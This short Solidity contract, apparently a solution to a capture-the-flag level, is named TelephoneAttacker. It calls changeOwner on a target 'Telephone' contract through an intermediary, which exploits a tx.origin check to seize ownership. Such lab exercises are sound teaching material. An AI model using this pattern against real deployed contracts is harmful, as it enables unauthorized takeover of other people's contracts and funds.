// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttacker {
    Telephone private telephone;

    constructor(Telephone _addr) {
        telephone = _addr;
    }

    function changeOwner(address _addr) public {
        telephone.changeOwner(_addr);
    }
}
